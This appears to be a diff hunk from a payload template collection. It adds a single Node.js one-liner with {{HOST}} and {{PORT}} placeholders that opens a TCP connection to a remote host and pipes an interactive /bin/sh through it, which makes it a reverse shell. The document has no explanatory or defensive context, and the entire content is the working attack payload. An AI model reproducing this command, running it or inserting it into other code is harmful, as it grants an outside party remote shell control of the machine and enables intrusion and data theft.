@@ -1,0 +1,1 @@
+node -e 'const n=require("net"),{spawn}=require("child_process"),s=n.connect({{PORT}},"{{HOST}}",()=>{const p=spawn("/bin/sh",["-i"]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);s.on("close",()=>p.kill());p.on("exit",()=>s.end())});s.on("error",()=>process.exitCode=1)'
